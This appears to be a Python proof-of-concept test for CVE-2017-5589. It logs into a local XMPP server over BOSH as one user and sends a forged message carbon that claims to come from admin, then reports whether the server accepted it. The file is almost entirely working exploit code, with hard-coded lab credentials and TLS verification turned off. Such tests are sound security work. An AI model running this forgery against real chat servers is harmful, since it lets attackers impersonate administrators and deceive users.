#!/usr/bin/env python3
"""
Test CVE-2017-5589: Carbon copy message forgery vulnerability
This script uses user1's credentials to send a forged message appearing to come from admin
"""

import requests
import xml.etree.ElementTree as ET
import base64
import random
import time
import urllib3

# Disable SSL warnings for self-signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_bosh_body(rid, sid=None, **attrs):
    """Create BOSH body element"""
    body_attrs = {
        'rid': str(rid),
        'xmlns': 'http://jabber.org/protocol/httpbind'
    }
    if sid:
        body_attrs['sid'] = sid
    body_attrs.update(attrs)
    
    body = ET.Element('body', body_attrs)
    return body

def send_bosh_request(url, body_elem):
    """Send BOSH request and return response"""
    xml_str = ET.tostring(body_elem, encoding='unicode')
    print(f"Sending: {xml_str}")
    
    # Use HTTPS with certificate verification disabled
    response = requests.post(url, 
                           data=xml_str,
                           headers={'Content-Type': 'text/xml; charset=utf-8'},
                           timeout=10,
                           verify=False)  # Disable certificate verification
    
    print(f"Response: {response.text}")
    return response.text

def test_carbon_forgery():
    """Test carbon message forgery vulnerability (CVE-2017-5589)"""
    
    BOSH_URL = "https://localhost:5281/http-bind"
    DOMAIN = "10.0.2.2"
    USERNAME = "user1"  # Authenticated as user1
    PASSWORD = "user1pass"
    
    rid = random.randint(1000000, 9999999)
    
    print(f"🔍 Testing CVE-2017-5589 Carbon Copy Forgery Vulnerability")
    print(f"URL: {BOSH_URL}")
    print(f"Authenticated as: {USERNAME}@{DOMAIN}")
    print(f"Attempting to forge message from: admin@{DOMAIN}")
    print()
    
    try:
        # Step 1: Start session
        print("1. Starting BOSH session...")
        body = create_bosh_body(
            rid=rid,
            to=DOMAIN,
            wait='60',
            hold='1',
            content='text/xml; charset=utf-8',
            ver='1.6'
        )
        body.set('xmpp:version', '1.0')
        body.set('xmlns:xmpp', 'urn:xmpp:xmpp-bosh')
        
        response = send_bosh_request(BOSH_URL, body)
        
        # Extract SID
        if 'sid=' in response:
            sid = response.split("sid='")[1].split("'")[0]
            print(f"Got SID: {sid}")
        else:
            print("❌ Failed to get session ID")
            return False
            
        # Step 2: Authenticate (no need for STARTTLS over HTTPS)
        print("\n2. Authenticating...")
        rid += 1
        auth_string = f"\x00{USERNAME}\x00{PASSWORD}"
        auth_b64 = base64.b64encode(auth_string.encode()).decode()
        
        body = create_bosh_body(rid=rid, sid=sid)
        auth_elem = ET.SubElement(body, 'auth')
        auth_elem.set('xmlns', 'urn:ietf:params:xml:ns:xmpp-sasl')
        auth_elem.set('mechanism', 'PLAIN')
        auth_elem.text = auth_b64
        
        response = send_bosh_request(BOSH_URL, body)
        
        if 'success' not in response:
            print("❌ Authentication failed")
            return False
            
        # Step 3: Restart stream
        print("\n3. Restarting stream...")
        rid += 1
        body = create_bosh_body(rid=rid, sid=sid, to=DOMAIN)
        body.set('xmpp:restart', 'true')
        body.set('xmlns:xmpp', 'urn:xmpp:xmpp-bosh')
        
        response = send_bosh_request(BOSH_URL, body)
        
        # Step 4: Bind resource  
        print("\n4. Binding resource...")
        rid += 1
        body = create_bosh_body(rid=rid, sid=sid)
        iq = ET.SubElement(body, 'iq')
        iq.set('type', 'set')
        iq.set('id', 'bind1')
        bind = ET.SubElement(iq, 'bind')
        bind.set('xmlns', 'urn:ietf:params:xml:ns:xmpp-bind')
        resource = ET.SubElement(bind, 'resource')
        resource.text = 'VulnTest'
        
        response = send_bosh_request(BOSH_URL, body)
        
        # Step 5: Send forged carbon message
        print("\n5. Sending FORGED carbon message...")
        print("   ⚠️  Attempting to impersonate admin@{} using user1's credentials".format(DOMAIN))
        rid += 1
        message_id = f"forged-test-{int(time.time())}"
        
        body = create_bosh_body(rid=rid, sid=sid)
        message = ET.SubElement(body, 'message')
        message.set('xmlns', 'jabber:client')
        # KEY VULNERABILITY TEST: Using user1's session but claiming to be admin
        message.set('from', f'admin@{DOMAIN}')  # FORGED: claiming to be admin
        message.set('to', f'{USERNAME}@{DOMAIN}/Conversations')  # Send to user1
        message.set('type', 'chat')
        
        # Carbon wrapper
        sent = ET.SubElement(message, 'sent')
        sent.set('xmlns', 'urn:xmpp:carbons:2')
        
        forwarded = ET.SubElement(sent, 'forwarded')
        forwarded.set('xmlns', 'urn:xmpp:forward:0')
        
        # Original message (forged to appear from admin to user1)
        orig_message = ET.SubElement(forwarded, 'message')
        orig_message.set('xmlns', 'jabber:client')
        orig_message.set('from', f'admin@{DOMAIN}/admin-resource')  # FORGED: pretending to be admin
        orig_message.set('to', f'{USERNAME}@{DOMAIN}')  # Send to user1
        orig_message.set('type', 'chat')
        orig_message.set('id', message_id)
        
        msg_body = ET.SubElement(orig_message, 'body')
        msg_body.text = "🚨 VULNERABILITY TEST: This message appears to be from admin but was sent using user1's credentials! 🚨"
        
        # Handle timeout gracefully for carbon message
        try:
            response = send_bosh_request(BOSH_URL, body)
            if response and ('error' in response.lower() or 'forbidden' in response.lower()):
                print("✅ Server rejected forged message - NOT VULNERABLE")
                return False
            else:
                print("⚠️  Server accepted forged message - POTENTIALLY VULNERABLE")
        except Exception as e:
            if "timeout" in str(e).lower() or "read timeout" in str(e).lower():
                print("⚠️  Forged carbon message sent (server timeout is normal)")
                print("    Check your Conversations app to see if the message appears to come from admin")
            else:
                print(f"❌ Error sending forged carbon message: {e}")
                return False
        
        # Step 6: Close session
        print("\n6. Closing session...")
        rid += 1
        body = create_bosh_body(rid=rid, sid=sid, type='terminate')
        try:
            send_bosh_request(BOSH_URL, body)
        except:
            pass  # Ignore timeout on session termination
        
        print("\n" + "="*60)
        print("VULNERABILITY TEST RESULTS:")
        print("="*60)
        print("1. Check your Conversations app on the emulator")
        print("2. Look for the test message in user1's chat")
        print("3. If the message appears to be FROM admin TO user1,")
        print("   then your server is VULNERABLE to CVE-2017-5589")
        print("4. If the message is rejected or appears from user1,")
        print("   then your server is NOT vulnerable")
        print("="*60)
        
        return True
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    test_carbon_forgery()